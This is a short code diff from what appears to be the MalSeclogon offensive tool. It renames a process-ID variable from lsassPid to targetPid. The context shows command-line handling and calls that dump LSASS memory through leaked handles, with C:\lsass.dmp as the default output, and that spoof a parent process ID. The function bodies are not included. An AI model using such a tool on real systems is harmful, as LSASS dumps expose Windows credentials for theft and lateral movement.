@@ -20,7 +20,7 @@ BOOL FileExists(LPCTSTR szPath);
 
 int wmain(int argc, wchar_t** argv)
 {
-	int lsassPid = -1;
+	int targetPid = -1;
 	BOOL dumpLsass = FALSE;
 	BOOL handlesLeaked = FALSE;
 	wchar_t defaultDumpPath[] = L"C:\\lsass.dmp";
@@ -37,7 +37,7 @@ int wmain(int argc, wchar_t** argv)
 			case 'p':
 				++cnt;
 				--argc;
-				lsassPid = _wtoi(argv[cnt]);
+				targetPid = _wtoi(argv[cnt]);
 				break;
 
 			case 'd':
@@ -78,19 +78,19 @@ int wmain(int argc, wchar_t** argv)
 		--argc;
 	}
 
-	if (lsassPid == -1) {
+	if (targetPid == -1) {
 		usage();
 		exit(-1);
 	}
 
 	if (dumpLsass) {
 		if (handlesLeaked)
-			MalSeclogonDumpLsassFromLeakedHandles(lsassPid, dumpPath);
+			MalSeclogonDumpLsassFromLeakedHandles(targetPid, dumpPath);
 		else
-			MalSeclogonLeakHandles(lsassPid, dumpPath);
+			MalSeclogonLeakHandles(targetPid, dumpPath);
 	}
 	else {
-		MalSeclogonPPIDSpoofing(lsassPid, cmdline);
+		MalSeclogonPPIDSpoofing(targetPid, cmdline);
 	}
 
 	return 0;
